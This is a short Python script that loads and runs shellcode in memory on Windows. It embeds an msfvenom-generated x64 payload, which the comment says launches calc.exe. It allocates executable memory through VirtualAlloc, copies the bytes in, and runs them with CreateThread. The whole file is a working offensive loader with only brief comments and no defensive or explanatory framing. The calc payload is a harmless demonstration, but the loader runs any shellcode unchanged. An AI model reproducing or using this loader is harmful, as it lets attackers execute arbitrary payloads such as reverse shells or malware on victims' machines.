import ctypes as ct

# msfvenom -p windows/x64/exec CMD=calc.exe -b "\x00" -f py
shellcode = bytearray(
    b"\x48\x31\xc9\x48\x81\xe9\xdd\xff\xff\xff\x48\x8d\x05"
    b"\xef\xff\xff\xff\x48\xbb\xa6\x96\x76\x58\xaf\xe6\x5c"
    b"\xe7\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
    b"\x5a\xde\xf5\xbc\x5f\x0e\x9c\xe7\xa6\x96\x37\x09\xee"
    b"\xb6\x0e\xb6\xf0\xde\x47\x8a\xca\xae\xd7\xb5\xc6\xde"
    b"\xfd\x0a\xb7\xae\xd7\xb5\x86\xde\xfd\x2a\xff\xae\x53"
    b"\x50\xec\xdc\x3b\x69\x66\xae\x6d\x27\x0a\xaa\x17\x24"
    b"\xad\xca\x7c\xa6\x67\x5f\x7b\x19\xae\x27\xbe\x0a\xf4"
    b"\xd7\x27\x10\x24\xb4\x7c\x6c\xe4\xaa\x3e\x59\x7f\x6d"
    b"\xdc\x6f\xa6\x96\x76\x10\x2a\x26\x28\x80\xee\x97\xa6"
    b"\x08\x24\xae\x44\xa3\x2d\xd6\x56\x11\xae\x36\xbf\xb1"
    b"\xee\x69\xbf\x19\x24\xd2\xd4\xaf\xa7\x40\x3b\x69\x66"
    b"\xae\x6d\x27\x0a\xd7\xb7\x91\xa2\xa7\x5d\x26\x9e\x76"
    b"\x03\xa9\xe3\xe5\x10\xc3\xae\xd3\x4f\x89\xda\x3e\x04"
    b"\xa3\x2d\xd6\x52\x11\xae\x36\x3a\xa6\x2d\x9a\x3e\x1c"
    b"\x24\xa6\x40\xae\xa7\x46\x37\xd3\xab\x6e\x14\xe6\x76"
    b"\xd7\x2e\x19\xf7\xb8\x05\xbd\xe7\xce\x37\x01\xee\xbc"
    b"\x14\x64\x4a\xb6\x37\x0a\x50\x06\x04\xa6\xff\xcc\x3e"
    b"\xd3\xbd\x0f\x0b\x18\x59\x69\x2b\x10\x15\xe7\x5c\xe7"
    b"\xa6\x96\x76\x58\xaf\xae\xd1\x6a\xa7\x97\x76\x58\xee"
    b"\x5c\x6d\x6c\xc9\x11\x89\x8d\x14\x16\xe9\x45\xf0\xd7"
    b"\xcc\xfe\x3a\x5b\xc1\x18\x73\xde\xf5\x9c\x87\xda\x5a"
    b"\x9b\xac\x16\x8d\xb8\xda\xe3\xe7\xa0\xb5\xe4\x19\x32"
    b"\xaf\xbf\x1d\x6e\x7c\x69\xa3\x3b\xce\x8a\x3f\xc9\xc3"
    b"\xee\x13\x58\xaf\xe6\x5c\xe7")

# allocate memory 
ct.windll.kernel32.VirtualAlloc.restype = ct.c_void_p
ptr = ct.windll.kernel32.VirtualAlloc(ct.c_int(0), 
                                      ct.c_int(len(shellcode)), 
                                      ct.c_int(0x3000), 
                                      ct.c_int(0x40))
# copy shellcode to temporary buffer
buffer = (ct.c_char * len(shellcode)).from_buffer(shellcode)

# copy from buffer to allocated memory
ct.windll.kernel32.RtlMoveMemory(ct.c_void_p(ptr), 
                                 buffer, 
                                 ct.c_int(len(shellcode)))

# execute as thread
thread = ct.windll.kernel32.CreateThread(
                                ct.c_int(0), 
                                ct.c_int(0), 
                                ct.c_void_p(ptr), 
                                ct.c_int(0), 
                                ct.c_int(0), 
                                ct.pointer(ct.c_int(0)))

# wait execution until finish
ct.windll.kernel32.WaitForSingleObject(ct.c_int(thread), ct.c_int(-1))

# deallocate memory
ct.windll.kernel32.VirtualFree( ct.c_void_p(ptr), 
                                ct.c_int(len(shellcode)),
                                ct.c_int(0x8000))